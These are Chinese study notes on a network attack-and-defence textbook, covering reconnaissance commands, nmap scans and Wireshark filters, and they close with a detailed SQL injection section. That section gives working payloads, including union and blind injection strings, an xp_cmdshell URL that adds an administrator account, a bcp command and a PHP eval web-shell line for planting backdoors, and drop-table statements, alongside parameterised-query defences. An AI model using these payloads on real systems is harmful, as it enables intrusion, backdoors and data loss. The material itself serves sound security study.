这部分内容基于诸葛建伟老师的《网络攻防技术与实践》。

## 网络安全攻防技术

### 网络信息收集技术

#### 网络踩点

##### Web 信息搜索与挖掘

- Google Hacking

  | 功能类别           | 操作符        | 用法示例                                    | 核心作用                                                     |
  | ------------------ | ------------- | ------------------------------------------- | ------------------------------------------------------------ |
  | 基础逻辑控制 | " "           | "人工智能发展趋势"                          | 精确匹配引号内的完整词组，排除拆分或语序不同的结果。         |
  |                    | -             | 机器学习 -课程                              | 排除包含 “课程” 关键词的结果，仅保留与 “机器学习” 相关的非课程内容。 |
  |                    | OR            | Python OR Java                              | 查找包含任意一个关键词的结果。                               |
  |                    | AND（可省略） | 数据挖掘 AND 实战（等同于 “数据挖掘 实战”） | 查找同时包含所有关键词的结果，Google 默认用空格实现 “逻辑与”，AND可显式强调。 |
  | 页面元素定位   | intitle:      | intitle:网站安全漏洞                        | 仅返回 “标题” 中包含 “网站安全漏洞” 的网页。                 |
  |                    | allintitle:   | allintitle:SEO 优化技巧                     | 仅返回 “标题” 中同时包含 “SEO” 和 “优化技巧” 的网页。        |
  |                    | intext:       | intext:用户隐私保护                         | 仅返回 “正文内容” 中包含 “用户隐私保护” 的网页。             |
  |                    | allintext:    | allintext:区块链 应用场景 金融              | 仅返回 “正文内容” 中同时包含 “区块链”“应用场景”“金融” 的网页。 |
  |                    | inurl:        | inurl:blog tech                             | 仅返回 “URL 链接” 中包含 “blog” 和 “tech” 的网页（关键词顺序可灵活）。 |
  |                    | allinurl:     | allinurl:admin login                        | 仅返回 “URL 链接” 中同时包含 “admin” 和 “login” 的网页（关键词需全部出现）。 |
  |                    | inanchor:     | inanchor:Python教程 Java                    | 仅返回 “锚文本” 中包含 “Python教程” 和 “Java” 的网页（关键词顺序可灵活）。 |
  |                    | allinanchor:  | allinanchor:Python教程 Java                 | 仅返回 “锚文本” 中同时包含 “Python教程” 和 “Java” 的网页（关键词需全部出现）。 |
  | 范围与来源限定 | site:         | site:github.com Python 项目                 | 仅在 “[github.com](https://github.com)” 网站内搜索包含 “Python 项目” 的内容。 |
  |                    | filetype:     | filetype:ppt 产品发布会方案                 | 仅返回 “PPT 格式” 的文件，内容与 “产品发布会方案” 相关。     |
  |                    | $             | wireless headphones $50-$100                | 搜索售价在 50-100 美元之间的 “无线耳机”（支持价格范围）。    |
  |                    | ...           | 奥运会 2000...2020                          | 搜索 2000 年至 2020 年期间与 “奥运会” 相关的内容，实现时间 / 数字范围查询。 |
  | 特殊功能       | ~             | ~healthy diet                               | 搜索包含 “healthy diet”（健康饮食）及近似词（如 “nutritious meals”）的结果。 |
  |                    | related:      | related:medium.com                          | 查找与 “[medium.com](https://medium.com)” 网站内容、风格类似的其他网站。 |
  |                    | link          | link::medium.com                            | 查找与 “[medium.com](https://medium.com)” 存在链接的其他网站。 |
  |                    | define:       | define:元宇宙                               | 直接返回 “元宇宙” 的定义解释，无需额外筛选定义类内容。       |
  |                    | location:     | coffee shop location:Shanghai               | 搜索 “上海” 地区的 “咖啡店”，精准定位地域相关结果。          |

- Shodan

##### DNS 与 IP 查询

```shell
## 查询 DNS 注册信息
## Linux
whois

## 查询映射 IP 地址
## Linux
dig
## Windows
nslookup

## 跟踪路由路径
## Linux
traceroute
## Windows
tracert

## 查看网络连接状态、路由表、接口统计等
## Linux or Windows
netstat
```

#### 网络扫描

##### 主机扫描

```shell
## 默认全部
nmap -sn
## 或 -sP

## ICMP Echo 主机扫描
nmap -PE

## TCP SYN 主机扫描
nmap -PS [ip]

## TCP ACK 主机扫描
nmap -PA [ip]

## UDP 主机扫描
nmap -PU [ip]
```

- 防范：Snort 等 IDS

##### 端口扫描

```shell
## TCP connect() 扫描
nmap -sT [ip]

## TCP SYN 扫描
nmap -sS [ip]

## FIN 端口扫描
nmap -sF [ip]

## NULL 端口扫描
nmap -sN [ip]

## ACK 端口扫描
nmap -sA [ip]

## Xmas 端口扫描
nmap -sX [ip]

## UDP 端口扫描
nmap -sU [ip]
```

- 防范：主要预防；Snort 等 IDS 和 IPS

##### 系统类型探查

```shell
## 操作系统主动探测
nmap -O [ip]

## 操作系统被动辨识：P0f. siphon

## 网络服务主动探测
nmap -sV [ip]

## 网络服务被动辨识：PADS
```

##### 漏洞扫描

- 技术原理
    1. 安全漏洞数据库：漏洞信息、漏洞扫描评估的脚本、CVSS
    2. 扫描引擎模块：前文四种扫描与探测
    3. ...
- Nessus 漏洞扫描器
- 防范：主要是预防

#### 网络查点

在实施远程渗透攻击之前，针对已知的弱点，对识别出来的服务进行更加充分更具针对性的探查，来寻找真正可以攻击的入口，以及攻击过程中可能需要的关键数据。

##### 网络服务旗标抓取

```shell
telnet

## netcat
nc -v [url] [port]
```

##### 通用网络服务查点

##### 类 UNIX 平台网络服务查点

```shell
## 查点 RPC
rpcinfo -p [ip]
nmap -sR [ip]

## 查点 SNMP
snmpwalk
## 以及图形化界面工具 IP Browser
```

##### Windows 平台网络服务查点

```shell
## 查点 NetBIOS
net view /domain
```



##### 网络查点防范措施





### 网络嗅探与协议分析

#### 网络嗅探

##### 网络嗅探的原理与实现



##### 网络嗅探器软件



##### 网络嗅探的探测与防范



#### 网络协议分析

##### 网络协议分析技术

##### 网络协议分析工具 Wireshark

- 捕获过滤器

  基于 **BPF（Berkeley Packet Filter）语法**，简洁且面向底层协议，核心格式为“协议 条件 值”，支持逻辑运算符（`and`/`or`/`not`，可简写为 `&&`/`||`/`!`）。  

  ##### 常用示例：

  | 过滤条件                | 含义                                               |
  | ----------------------- | -------------------------------------------------- |
  | `host 192.168.1.1`      | 只捕获与IP为[192.168.1.1](192.168.1.1)相关的数据包 |
  | `port 80`               | 只捕获端口为80（HTTP）的数据包                     |
  | `tcp port 443`          | 只捕获TCP协议且端口为443（HTTPS）的包              |
  | `udp and host 10.0.0.2` | 只捕获UDP协议且与[10.0.0.2](10.0.0.2)相关的包      |
  | `not arp`               | 排除ARP协议的数据包                                |

- 显示过滤器

  基于 Wireshark 自定义语法，更复杂且面向解析后的协议字段，核心格式为“协议.字段 == 值”，支持丰富的比较运算符（`==`/`!=`/`>=`/`contains`等）和逻辑运算符（`and`/`or`/`not`）。  

  ##### 常用示例：

  | 过滤条件                         | 含义                                             |
  | -------------------------------- | ------------------------------------------------ |
  | `ip.addr == 192.168.1.1`         | 显示源IP或目的IP为[192.168.1.1](192.168.1.1)的包 |
  | `tcp.port == 80`                 | 显示源端口或目的端口为80的TCP包                  |
  | `http.request.method == "GET"`   | 显示HTTP请求方法为GET的包                        |
  | `dns.qry.name contains "google"` | 显示DNS查询中包含“google”的包                    |
  | `not icmp`                       | 排除ICMP协议（如ping包）                         |



### TCP/IP 网络协议栈攻击

#### 概述

##### 网络安全属性和与攻击模式

| 基本攻击模式       | 攻击类型 | 所破坏的网络安全属性 |
| ------------------ | -------- | -------------------- |
| 截获（嗅探、监听） | 被动攻击 | 机密性               |
| 篡改               | 主动攻击 | 完整性               |
| 中断（DoS）        | 主动攻击 | 可用性               |
| 伪造               | 主动攻击 | 真实性               |
|                    |          | 不可抵赖性           |

##### TCP/IP 网络协议栈安全缺陷与攻击技术

- 网络接口层
- 互联层
- 传输层
- 应用层

##### 原始报文伪造技术及工具

#### 网络层协议攻击

##### IP 源地址欺骗

- IP 源地址欺骗原理
- IP 源地址欺骗技术的应用场景
- 利用 Netwox 进行 IP 源地址欺骗
- IP 源地址欺骗的防范措施

##### ARP 欺骗

- ARP 协议工作原理
- ARP 欺骗攻击技术原理
- ARP 欺骗技术的应用场景
- 利用 Netwox 进行 ARP 欺骗
- ARP 欺骗攻击技术防范措施

##### ICMP 路由重定向攻击

- ICMP 路由重定向机制原理
- ICMP 路由重定向攻击技术
- 利用 Netwox 进行 ICMP 路由重定向攻击
- ICMP 路由重定向攻击防范

#### 传输层协议攻击

##### TCP RST 攻击



##### TCP 会话劫持攻击

- TCP 会话劫持攻击原理
- TCP 会话劫持攻击技术过程
- TCP 会话劫持攻击防范措施

##### TCP SYN Flood 拒绝服务攻击

- SYN Flood 攻击原理
- 利用 Netwox 进行 TCP SYN Flood 攻击
- SYN Flood 攻击防范措施
  - SYN-Cookie 技术
  - 防火墙地址状态监控技术

##### UDP Flood 拒绝服务攻击



#### TCP/IP 网络协议栈攻击防范措施

- 监测、预防与安全加固
- 网络安全协议
    - 网络接口层的安全协议
    - 网络互联层的安全协议
    - 传输层的安全协议
    - 应用层的安全协议
- 下一代互联网协议

### 网络安全防范技术

#### 安全模型



#### 网络安全防范技术和与系统

##### 防火墙技术概述

- 防火墙的功能

    - 检查控制进出网络的网络流量
    - 防止脆弱或不安全的协议和服务
    - 防止内部网络信息的外泄
    - 对网络存取和访问进行监控审计
    - 防火墙可以强化网络安全策略并集成其他安全防御机制

- 防火墙的不足

  网络边界访问控制机制的先天不足：

    - 来自网络内部的安全威胁
    - 通过非法外联的网络攻击
    - 计算机病毒传播

  技术瓶颈：

    - 针对开放服务安全漏洞的渗透攻击
    - 针对网络客户端程序的渗透攻击
    - 基于隐蔽通道进行通信的特洛伊木马或僵尸网络

##### 防火墙技术和产品

- 包过滤技术
- 基于状态检测的包过滤技术
- 代理技术
    - 应用层代理技术
    - 电路级代理技术
    - NAT 代理技术
- 防火墙产品
- 防火墙部署方法
- 其他网络防御技术
    - VPN
    - //

#### 网络检测技术与系统

##### 入侵检测技术概述



##### 入侵检测系统：Snort



#### 网络安全事件响应技术





## 系统安全攻防技术

### Windows 操作系统安全攻防

#### Windows 操作系统的基本结构



#### Windows 操作系统的安全体系结构与机制

##### Windows 安全体系结构



##### Windows 身份认证机制

- 安全主体：用户、用户组、计算机
- SID：形如`S-1-5-21-3170186647-2604921064-2923912053-1003`，1 为版本号，第三位是 48bit 数值，表示标识符颁发机构（5 代表 the Windows Security authority），之后为多个 32bit 数值的子颁发机构表示，最后一部分是 RID，一般 Administrator 账户的 RID 均为 500。
- 为每个用户和计算机设置账户：
    - 拥有最高权限的本地 Administrator 账户
    - 作为自动运行系统进程环境的 SYSTEM/LocalSystem 账户
    - IUSR_Machinename IIS 服务的匿名网络访问账户等
- 用户组
    - 本地最高权限用户组 Administrators

##### Windows 授权与访问控制机制



##### Windows 安全审计机制



##### Windows 的其他安全机制

- 安全中心：防火墙、补丁自动更新、病毒防护
- 网络访问控制（NAC）
- IPSec 加密与验证机制
- EFS 文件加密系统
- BitLocker 磁盘加密
- Windows 资源保护（WRP）
- Secure Boot

#### Windows 操作系统远程安全攻防技术



##### Windows 系统的安全漏洞与生命周期



##### Windows 远程口令猜测与破解攻击



##### Windows 网络服务全称渗透攻击



##### Metasploit Windows Attack



#### Windows 操作系统远程安全攻防技术

##### Windows 本地特权提升



##### Windows 敏感信息窃取



##### Windows 消踪灭迹



##### Windows 远程控制与后门程序





### Linux 操作系统安全攻防

#### Linux 操作系统的结构

##### Linux 的进程与线程管理机制

抢占式多用户多进程。进程作为最基本的调度单元，维护一个 PCB 结构，由内核 schedule 进程调度函数来一句进程优先级和 CPU 等资源情况来选择进程进行执行。

##### Linux 的内存管理机制 



##### Linux 的文件系统管理机制



##### Linux 的设备控制机制



##### Linux 的网络机制



##### Linux 的系统调用机制



#### Linux 操作系统的安全机制

##### Linux 身份认证机制

- Linux 用户
    - 角色类型
        - Root 根用户
        - 普通用户
        - 系统用户：不能登录系统，但却是系统运行不可缺少的用户，如用于启动网络服务的 daemon、apache，以及匿名访问的 nobody、ftp等。
    - 用户信息：保存在`/etc/passwd`，包括用户名、每个用户唯一的 uid、使用 Shell 类型、用户初始目录等
    - 加密口令字：保存在 `/etc/shadow`，只对 Root 可读

- Linux 用户组
    - 用户组信息：保存在`/etc/group`，包括用户组名称、用户组 gid、用户组包含的用户名列表
    - 加密口令字：保存在`/etc/gshadow`

  ```shell
  ## 查询和显示当前用户所属组
  id -a
  
  ## 添加用户组
  groupadd
  
  ## 向特定组添加用户
  usermod -G [group_name] [user_name]
  ```

- Linux 的本地登录用户认证机制
    - init 进程启动 getty 产生若干虚拟控制台（如 tty1，tty2等）。在控制台显示登陆，当用户敲入用户时，getty 执行 login 进程，认证成功后 login 进程会 fork 相应用户 Shell 的子进程。用户可以在对应的 Shell 下开始工作。
    - 登录 login 进程通过 `Crypt()` 函数对口令验证。 `Crypt()` 函数用户设置密码时，会随机产生一个 salt，与用户的密码一起加密，得到加密口令字，并和 salt 一起保存在 shadow 文件中。
- Linux 的远程登录用户认证机制
    - SSH
        - 基于口令的身份认证
        - 基于非对称密钥的身份认证：用户为自己创建一对非对称密钥，并把公钥放置到需要访问的服务器上。在连接 SSH 服务器时，客户端软件会对服务器发送请求，请求使用证书方式进行身份认证。服务器收到请求后，使用请求用户的公钥加密“质询”并把它发送给客户端软件。客户端软件收到“质询”后就可以使用私人密钥进行解密，再发送给服务器端，完成认证。
  - Apache//
  - Samba//

- Linux 的统一身份认证中间件——PAM

  PAM（Pluggable Authentication Modules：可插入身份认证模块）//

##### Linux 授权与访问控制机制

- 文件的所有者：以所有者的 uid 和文件所有者所在组的 gid 指明。

  ```shell
  ## 修改所有者
  chown [选项] 新所有者[:新所属组] 目标文件/目录
  ```

- 文件的访问权限

  10个标志位：

  - 1：文件类型。“-”普通文件，“d”目录，“l”符号链接，“b”块设备文件，“c”字符设备（串行端口设备）
  - 2~10：每3个一组分为3组，分别表示文件所有者、所属组用户以及其他用户对该文件的读（R）、写（W）、执行（X）权限

- 文件的特殊执行权限

  数字表示法：特殊权限对应额外的数字位（放在基础权限数字前）

  - SUID：仅对可执行文件有效。当一个可执行文件设置了 SUID 权限时，用户执行该文件时，会临时获得文件所有者的权限（而非执行用户自身的权限）。

    ```shell
    chmod u+s 文件名   ## 设置 SUID
    chmod u-s 文件名   ## 取消 SUID
    ```

  - SGID：

      - 对可执行文件：执行文件时，临时获得文件所属组的权限。
      - 对目录：在该目录下新建的文件 / 子目录，其所属组会继承目录的所属组（而非创建者的主组）。

    ```shell
    chmod g+s 文件名/目录名   ## 设置 SGID
    chmod g-s 文件名/目录名   ## 取消 SGID
    ```

  - Sticky Bit：仅对目录有效，用于限制目录中文件的删除权限 —— 即使用户对目录有写权限，也只能删除自己创建的文件，无法删除其他用户的文件。

    ```shell
    chmod +t 目录名   ## 设置粘滞位
    chmod -t 目录名   ## 取消粘滞位
    ```

- Linux 访问控制机制的不足及改进

  //

##### Linux 安全审计机制

- 连接事件日志：由多个程序执行，把记录写入到 `/var/log/wtmp`和`var/log/utmp`，login 等用户登录程序复制更新 wtmp 和 utmp 文件，使系统管理员能够跟踪谁在何时登录到系统

- 进程统计日志：由系统内核执行，当一个进程结束时，为每个进程往进程统计文件（paact 或 acct）中写一个记录。

- 错误日志记录：由通用的日志记录服务 syslogd（8）执行，各种系统守护进程、用户程序和内核通过 syslog 向文件 `var/log/messages`报告值得注意的事件。

  //

#### Linux 操作系统远程安全攻防技术

##### Linux 远程口令字猜解攻击



##### Linux 网络服务远程渗透攻击

- Linux 系统安全漏洞、渗透攻击与补丁更新过程
- 针对 Linux 系统网络服务的远程渗透攻击
- Linux 内核中的网络协议栈实现
- LAMP Web 网站构建解决方案中的网络服务
- FTP、Samba 等文件共享服务
- 电子邮件收发服务
- 其他网络服务
- 针对 Linux 系统网络服务的远程渗透攻击的安全防范措施

##### 攻击 Linux 客户端程序和用户

- 攻击 Linux 平台上的客户端程序
- 攻击 Linux 系统用户
- 针对客户端与用户攻击的安全防范措施

##### 攻击 Linux 路由器和监听器

- 攻击 Linux 路由器与防火墙
- 攻击监听器和入侵检测器
- 针对路由器与见同期攻击的安全防范措施

##### Metasploit Linux Attack

//

#### Linux 操作系统远程安全攻防技术

##### Linux 本地特权提升

- Linux 用户口令字破解
- 利用 sudo 的缺陷进行特权提升
- 利用用户态 SUID 程序漏洞进行特权提升
- 针对 SUID 程序的本地缓冲区溢出攻击
- 针对 SUID 程序的符号链接攻击
- 针对 SUID 程序的竞争条件攻击
- 针对 SUID 程序的共享函数库攻击
- 利用内核空间代码漏洞进行特权提升
- 利用系统配置不当实施本地特权提升
- 针对 Linux 本地特权提升攻击的防范技术与措施

##### Linux 消踪灭迹



##### Linux 远程控制与后门程序





### 恶意代码安全攻防

#### 恶意代码基础知识



##### 计算机病毒



##### 网络蠕虫



##### 后门与木马



##### 僵尸程序与僵尸网络



##### Rootkit



#### 恶意代码分析方法

##### 恶意代码分析技术概述



##### 恶意代码分析环境



##### 恶意代码静态分析技术



##### 恶意代码动态分析技术





### 软件安全攻防——缓冲区溢出和 Shellcode

#### 软件安全概述

##### 软件安全漏洞威胁



##### 软件安全困境



##### 软件安全漏洞类型



#### 缓冲区溢出基础概念

##### 缓冲区溢出的基本概念



##### 缓冲区溢出攻击背景知识



##### 缓冲区异常攻击原理



#### Linux 平台上的栈溢出与 Shellcode

##### Linux 平台栈溢出攻击技术



##### Linux 平台的 Shellcode 实现技术



#### Windows 平台上的栈溢出与 Shellcode

##### Windows 平台栈溢出攻击技术



##### Windows 平台的 Shellcode 实现技术



#### 堆溢出攻击



#### 缓冲区溢出攻击的防御技术





## Web 安全攻防技术

### Web 应用程序安全攻防

#### Web 应用程序体系结构及其安全威胁

##### Web 应用体系结构

- 浏览器
- Web 服务器
- Web 应用程序
- 数据库
- 传输协议 HTTP/HTTPS

##### Web 应用安全威胁

- 针对浏览器和终端用户的 Web 浏览安全威胁
- 针对传输网络的网络协议安全威胁
- 系统层安全威胁
- Web 服务器软件安全威胁
- **Web 应用程序安全威胁**
- Web 数据安全威胁

#### Web 应用程序安全攻防概述

##### 信息收集

- 手工审查 Web 应用程序结构与源代码
    - 静态和动态生成的页面
    - 目录结构
    - 辅助文件：CSS、XML、JavaScript、include 文件等
    - 输入表单：GET/POST、表单处理行为、输入字段名称、最大长度限制、隐藏字段、自动完成标记、口令字段
    - 查询参数字符串
- 自动下载与镜像 Web 站点页面
- 使用 Google Hacking 技术审查与探测 Web 应用程序
- Web 应用程序安全评估与漏洞探测
    - 浏览器插件
    - Web 应用安全评估工具和漏洞扫描器：
        1. 以 Web 服务器与客户端之间的代理方式运行
        2. 结合爬虫技术对目标 Web 站点进行源码爬取、分析与评估探测
        3. 黑客攻击工具

##### 攻击 Web 服务器软件

- 数据驱动的远程代码执行安全漏洞：缓冲区溢出、不安全的指针、格式化字符串等
  
- 服务器功能扩展模块漏洞：

- 样本文件安全漏洞

- 源代码泄露

- 资源解析攻击

##### 攻击 Web 应用程序

OWASP Top 10

- 访问控制失效
- 加密失效
- 注入攻击
- 不安全设计
- 安全配置错误
- 易受攻击且过时的组件
- 身份识别与认证失效
- 软件与数据完整性失效
- 安全日志与监控失效
- 服务器端请求伪造

##### 攻击 Web 数据内容

- 安全敏感数据泄露
    - Web 服务器存在目录遍历漏洞或不安全的目录文件枚举配置
    - 利用 Web 服务器（FTP 服务器）的 Upload、income 等上传目录临时中转文件时泄露
    - 缺乏安全意识，在 Web 站点公开的文档资料中包含秘密信息
- 网页纂改：“被黑站点”
- 不良信息内容上传

##### Web 应用安全防范措施

- Web 站点网络传输安全设防措施
    - HTTPS
    - 加密的连接通道，避免使用 telnet、FTP、HTTP，而使用 SSH、SFTP
    - 对于关键的 Web 服务器：
        - 设置静态绑定 MAC-IP映射
        - 在服务网段内进行 ARP 等各类欺骗攻击的检测与 MAC 封禁机制
        - 在网关位置部署防火墙与 IDS
        - 对 Dos 攻击采用冗余等机制
- Web 站点操作系统及服务安全设防措施
    - 及时的补丁更新
        - Windows：通过软件正版化采纳自动更新补丁服务，部署 Windows Server 更新服务
        - Linux：采用 apt、yum 等软件自动更新工具，crond 设置定期更新任务脚本
    - 远程安全漏洞扫描
    - 一般性设防措施
        - 关闭所有不使用的服务，避免使用明文传输的网络服务
        - 设置强口令字，以及安全的服务配置
        - 部署防火墙，设置对控制及内容上传通道的限制访问
        - 配置数据备份服务，必要时设置冗余和双机热备机制
- Web 应用程序安全设防措施
    - 谨慎考虑是否采用动态页面技术、是否支持客户端执行代码、是否接受用户输入
    - 尽量使用具有良好安全声誉及稳定技术力量支持的 Web 应用软件包，并定期进行 Web 应用程序的安全评估和漏洞检测，对 Web 应用程序跟进版本更新和安全补丁发布情况
    - 只在必要时自主或外包开发应用程序，在开发和部署过程中重视安全编程、持续性的安全测试与维护
        - 独立、完整且集中的输入校正：校验全部的程序输入、校验输入长度与类型
        - 对 HTTP 所有内容进行校验：校验向用户输出的数据，使用安全的 SQL 查询方式
        - 禁止使用 JavaScript 进行任何校验
        - 使用安全统一的编码或转义方式
        - 设定有安全的权限边界
        - 校验被调用的后台命令、校验被调用的文本或配置文件、确保程序所记录的日志可控
    - 使用 Web 服务器软件提供的日志功能
        - 访问用户名、请求 URL、 referer 来源链接等
- Web 站点数据安全设防措施
    - 提高网站内容维护人员的数据安全意识
    - 对维护网站的数据安全实施日常监测和防护

#### SQL 注入

##### SQL 注入攻击原理

向 Web 应用程序提供的用户输入接口（动态页面的输入参数、表单的输入框等）输入一段精心构造的 SQL 查询命令，攻击和利用不完善的输入验证机制，使注入代码得以执行完成非预期的攻击操作行为。

##### SQL 注入攻击步骤和过程

1. 发现 SQL 注入点

    - 整数型参数

     ```sql
     SELCET * FROM some_table WHERE some_rec = yyy
     ```

     - `yyy` -> `yyy'`：返回错误提示信息
     - `yyy` -> `yyy and 1=1`：返回正常页面
     - `yyy` -> `yyy and 1=2`：返回空白页面或错误提示信息

     如果满足以上三种情况，存在注入点。

    - 字符型参数

     ```sql
     SELCET * FROM some_table WHERE some_rec = 'yyy'
     ```
    
     - `yyy` -> `yyy'`：返回错误提示信息
     - `yyy` -> `yyy' and '1'='1`：返回正常页面
     - `yyy` -> `yyy' and '1'='2`：返回空白页面或错误提示信息

     如果满足以上三种情况，存在注入点。

2. 判断后台数据库类型

    - 利用数据库特有函数进行判断
     - SQL Server：使用 `@@version` 查看版本，`db_name()` 查看当前数据库名
     - MySQL：使用 `version()` 查看版本，`database()` 查看当前数据库名
     - Oracle：使用 `sysdate` 获取系统时间，`user` 获取当前用户

    - 利用数据库服务器的系统变量进行判断

     - SQL Server: `user`, `db_name()`

       ```url
       http://SITE/xxx.asp?some_rec = yyy and db_name()>0
       ```

     - MySQL: `basedir`

    - 利用数据库服务器的系统表进行判断

     ```url
     http://SITE/xxx.asp?some_rec = yyy and (select count (*) from sysobjects)>0
     http://SITE/xxx.asp?some_rec = yyy and (select count (*) from msysobjects)>0
     ```

     - SQL Server: 第一条请求 URL 运行正常，第二条异常
     - ACCESS: 两条都异常，因为在 Web 环境下没有对 `msysobjects` 系统表的访问权限

3. 后台数据库中管理员口令字猜解

    - 猜解表名

     ```url
     http://SITE/xxx.asp?some_rec = yyy and (select count (*) from guessed_tbl_name)>0
     ```

    - 猜解字段名

     ```url
     http://SITE/xxx.asp?some_rec = yyy and (select Count(guessed_rec_name) from Admin)>0
     ```

    - 用户名与口令猜解

     取第一条记录，首先猜解用户名字段的长度：

     ```url
     http://SITE/xxx.asp?some_rec = yyy and (select top 1 len(username) from Admin)>[guessed_length]
     ```

     逐位猜解字符串每位字符的 ASCII 值，可以使用二分法：

     ```sql
     (select top 1 asc(mid(username,N,1)) from Admin)>[guessed_ascii]
     ```

     对口令值的猜解过程类似，但数据库存储的口令有时是 MD5 加密的，可以通过注入 SQL 修改口令，或者使用破译工具破解。

4. 上传 ASP 后门，得到默认账户权限

   SQL Server: 还可以利用 BCP 命令，将写入临时表终端 ASP 后台脚本内容导成文本文件，并放置到指定位置

   ```bash
   bcp "select codes from tmp_tbl" queryout c:\inetpub\wwwroot\runcommand.asp -c -S localhosgtg -U sa -P foobar
   ```

5. 本地权限提升

6. 利用数据库扩展存储过程执行 Shell 命令

   若数据库连接支持类似于 SQL Server 的 `xp_cmdshell` 扩展存储过程，且拥有数据库管理系统的最高管理权限，就可以利用该存储过程调用 Shell 命令进行任意操作，而无需步骤3~5

   通过请求如下 URL，在系统中添加一个用户，并将其加入到本地管理员组：

   ```url
   http://SITE/xxx.asp?some_rec = yyy; exec master.xp_cmdshell "net user name password /add"
   http://SITE/xxx.asp?some_rec = yyy; exec master.xp_cmdshell "net localgroup name administrators /add"
   ```

##### SQL 注入类型

###### 按 “注入点位置” 分类

根据攻击者可控制的输入位置（即注入点）划分，决定了注入的触发途径：

- GET 注入

注入点位于 URL 的 GET 参数中（如 `http://xxx.com/detail?id=1` 中的 id 参数），攻击者通过修改 URL 参数值插入 SQL 语句（如 `id=1' or 1=1-- `），是最易发现的注入类型。

- POST 注入

注入点位于表单提交的 POST 参数中（如登录表单的 “用户名”“密码” 字段），攻击者在输入框中填入 SQL 片段（如用户名输入 `admin' -- `），因参数不直接暴露在 URL 中，隐蔽性略高。

- Cookie 注入

注入点位于 HTTP 请求的 Cookie 字段中，若服务器使用 Cookie 参数（如 user=123）拼接 SQL 查询，攻击者可篡改 Cookie 值（如 `user=123' or 1=1-- `）触发注入，常见于依赖 Cookie 识别用户的场景。

- HTTP 头注入

注入点位于 HTTP 请求头（如 Referer、User-Agent、X-Forwarded-For 等），若服务器将头信息代入 SQL 查询（如记录访问来源时拼接 Referer），攻击者可篡改头信息插入 SQL 语句，此类注入隐蔽性强，易被忽略。

###### 按 “利用原理与反馈方式” 分类

根据服务器对注入语句的响应反馈特征划分，决定了攻击的技术手段：

- 显错注入
    - 特征：注入错误 SQL 语句后，服务器返回详细数据库错误信息（如 MySQL 的语法错误提示），攻击者可通过报错直接获取数据库结构（表名、字段名等）。
    
    - 示例：利用 `extractvalue(1,concat(0x7e,(select database()),0x7e))` 触发报错，直接读取当前数据库名。
  
- 盲注（无显式错误反馈）

  服务器不返回错误信息，仅通过间接响应判断注入结果，又分两类：

    - 布尔盲注：注入布尔判断语句（如 `id=1' and (substr(username,1,1)='a')-- `），通过页面 “正常显示” 或 “异常空白” 判断条件真假，逐字符猜解数据。
    - 时间盲注：注入延迟判断语句（如 `id=1' and if(条件,sleep(5),0)-- `），通过服务器 “是否延迟响应” 判断条件真假，适用于无任何页面差异的场景。

- Union 注入

    - 原理：利用 SQL 的 `UNION` 关键字，将注入的查询结果与原页面查询结果合并返回，适用于原查询返回数据集的场景（如商品列表、用户列表）。
    
    - 操作步骤：先通过 `order by` 判断字段数，再用 `union select` 注入查询（如 `id=-1' union select 1,version(),3-- `）获取数据库信息。



- 堆叠查询注入

    - 原理：利用数据库支持多语句执行的特性（如 MySQL 用 ; 分隔），注入多个 SQL 语句（如 `id=1'; drop table users;-- `），可执行查询、删除、修改等操作。
    
    
    - 限制：需数据库支持多语句执行（如 MySQL 默认支持，SQL Server 部分场景支持），且应用程序会执行所有拼接语句。



###### 按 “攻击目标” 分类

根据注入的最终意图和造成的影响划分：

- 数据窃取注入

目的是获取数据库敏感数据（如用户账号密码、订单信息），通过显错、盲注、联合查询等方式实现，是最常见的注入目的。

- 权限提升注入

通过注入修改数据库权限（如 `grant all privileges`）或篡改管理员账号（如 `update users set password='123' where username='admin'-- `），获取系统更高权限。

- 文件操作注入

利用数据库文件操作函数（如 MySQL 的 `into outfile`），将恶意代码写入服务器文件系统（如生成后门脚本 `<?php eval($_POST[cmd]);?>`），控制服务器。

- 破坏性注入

注入 `drop table`、`delete from` 等语句删除数据，或执行 `shutdown` 命令中断数据库服务，破坏业务正常运行，危害性极大。

##### SQL 注入攻击工具

- [SQLmap](C:\Data\Desktop\Learning\SQLmap.md)

##### SQL 注入攻击防范措施

- 使用类型安全（type-safety）的输出编码机制

- 检查来自外部的用户输入，对包含限制字符的查询进行拒绝或转义
    - 整数型用户参数：限制其包含非数字字符
    - 字符串型用户参数：限制保护引号、分号、百分号等 SQL 语句保留符号
  
- 将动态 SQL 语句替换为存储过程、预编译 SQL 或 ADO 命令对象

    - 存储过程

        - 原理：在数据库中预定义包含参数的SQL逻辑，应用程序仅传递参数值，不直接拼接SQL。数据库会将参数视为纯数据，而非可执行代码。

        - 示例（以SQL Server为例）：  

		先创建存储过程（含参数`@username`和`@password`）：

		```sql
			CREATE PROCEDURE LoginUser
				@username VARCHAR(50),
				@password VARCHAR(50)
			AS
			BEGIN
				SELECT * FROM users WHERE username = @username AND password = @password
			END
			````

		应用程序调用时仅传递参数值（以VB为例）：

		```vb
		' 使用ADO调用存储过程，参数化传递
		Set cmd = New ADODB.Command
		cmd.ActiveConnection = conn ' 已建立的连接
		cmd.CommandText = "LoginUser" ' 存储过程名称
		cmd.CommandType = adCmdStoredProc ' 声明为存储过程
		
		' 添加参数（类型、长度需与存储过程匹配）
		cmd.Parameters.Append cmd.CreateParameter("@username", adVarChar, adParamInput, 50, username)
		cmd.Parameters.Append cmd.CreateParameter("@password", adVarChar, adParamInput, 50, password)
		
		' 执行并获取结果
		Set rs = cmd.Execute
		```

    - 预编译SQL

        - 原理：先向数据库发送“带参数占位符”的 SQL 模板，数据库预编译后，仅接收参数值执行。占位符（如`?`或`@参数名`）会被数据库解析为纯数据占位，不执行任何代码。

      - 示例：

        ```php
        $stmt = $conn->prepare("SELECT name, local, gender
        						FROM USER_TABLE
        						WHERE id = ? and password = ? ");
         // 绑定参数
        $stmt->bind_param("is", $id, $pwd);
        $stmt->execute();
        $stmt->bind_result($bind_name, $bind_local, $bind_gender);
        $stmt->fetch();
        ```

    - ADO命令对象

        - 原理：ADO的`Command`对象支持参数化查询，通过`Parameters`集合定义参数，SQL语句中用`?`或命名参数（如`@username`）作为占位符，最终由ADO将参数安全传递给数据库。

        - 示例（VBScript/ASP中使用ADO）： 

		```vb
		' 1. 创建Command对象并关联连接
		Set cmd = Server.CreateObject("ADODB.Command")
		cmd.ActiveConnection = conn ' 已打开的Connection对象
		
		' 2. 定义带参数的SQL模板（用?作为占位符）
		cmd.CommandText = "SELECT * FROM users WHERE username = ? AND password = ?"
		cmd.CommandType = adCmdText ' 声明为SQL文本
		
		' 3. 添加参数（指定类型、长度、值，与占位符顺序对应）
